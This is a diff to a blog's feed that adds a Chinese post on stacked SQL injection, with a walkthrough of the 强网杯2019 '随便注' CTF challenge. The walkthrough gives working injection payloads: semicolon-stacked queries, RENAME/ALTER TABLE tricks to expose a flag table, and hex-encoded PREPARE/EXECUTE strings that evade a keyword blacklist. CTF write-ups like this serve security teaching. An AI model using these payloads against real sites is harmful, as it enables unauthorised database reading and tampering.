@@ -70,12 +70,23 @@
     <link href="https://www.twosmi1e.com/2019/12/25/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
     <id>https://www.twosmi1e.com/2019/12/25/堆叠注入/</id>
     <published>2019-12-25T14:43:23.000Z</published>
-    <updated>2019-12-25T14:43:23.730Z</updated>
+    <updated>2019-12-25T15:03:10.071Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p> Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked  injection。</p><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用<code>mysqli_multi_query()</code>函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是<code>mysqli_ query()</code>函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p><h2 id="强网杯2019-随便注"><a href="#强网杯2019-随便注" class="headerlink" title="强网杯2019 随便注"></a>强网杯2019 随便注</h2><p><img src="/2019/12/25/堆叠注入/1574410683306.png" alt="Alt text"></p><p>过滤了<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>尝试堆叠注入<br><code>/?inject=222&#39;;show databases;#</code><br><img src="/2019/12/25/堆叠注入/1574407751475.png" alt="Alt text"><br><code>/?inject=222&#39;;use ctftraining;show tables;#</code><br><img src="/2019/12/25/堆叠注入/1574407847082.png" alt="Alt text"><br>禁用了select，使用show columns from</p><p><code>1&#39;;use ctftraining;show columns from FLAG_TABLE;#</code><br><img src="/2019/12/25/堆叠注入/1574408083206.png" alt="Alt text"><br>假的 继续找<br><code>1&#39;;use supersqli;show tables;#</code><br><img src="/2019/12/25/堆叠注入/1574408211803.png" alt="Alt text"></p><p>?inject=1’;use supersqli;show columns from words;#<br><img src="/2019/12/25/堆叠注入/1574408631356.png" alt="Alt text"></p><p>?inject=1’; use supersqli; show columns from <code>1919810931114514</code>;#<br><img src="/2019/12/25/堆叠注入/1574408613541.png" alt="Alt text"></p><p>然后这里有个巧妙的解法，因为关键字禁了很多，想取出数据不容易<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br></pre></td></tr></table></figure></p><p>words是我们默认查询的表，重命名为words1，把flag所在表重命名为words，然后再用<br>1’ or 1=1#就可以看到flag了。</p><p><img src="/2019/12/25/堆叠注入/1574409043990.png" alt="Alt text"></p><p>还有一个思路就是<br><code>set @t=0x73656c65637420312c323b;prepare x from @t;execute x;</code><br>用16进制来绕过关键词检测         <code>select 1,2;</code><br><img src="/2019/12/25/堆叠注入/1574409627251.png" alt="Alt text"><br>这里strstr检测子串，可以用大小写绕过。<br><img src="/2019/12/25/堆叠注入/1574409769925.png" alt="Alt text"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select flag from 1919810931114514</span><br><span class="line">1&apos;;Set @t=0x73656c65637420666c61672066726f6d2031393139383130393331313134353134;Prepare x from @t;Execute x;#</span><br><span class="line"></span><br><span class="line">select * from 1919810931114514</span><br><span class="line">1&apos;;Set @t=0x73656c656374202a2066726f6d2031393139383130393331313134353134;Prepare x from @t;Execute x;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from supersqli.1919810931114514</span><br><span class="line">1&apos;;Set @t=0x73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134;Prepare x from @t;Execute x;#</span><br></pre></td></tr></table></figure><p><img src="/2019/12/25/堆叠注入/1574410446902.png" alt="Alt text"><br>done</p>]]></content>
     
     <summary type="html">
     
+      
+      
+        &lt;h2 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;/a&gt;定义&lt;/h2&gt;&lt;p&gt; Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的
+      
+    
     </summary>
     
+    
+      <category term="web安全" scheme="https://www.twosmi1e.com/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="SQL注入" scheme="https://www.twosmi1e.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
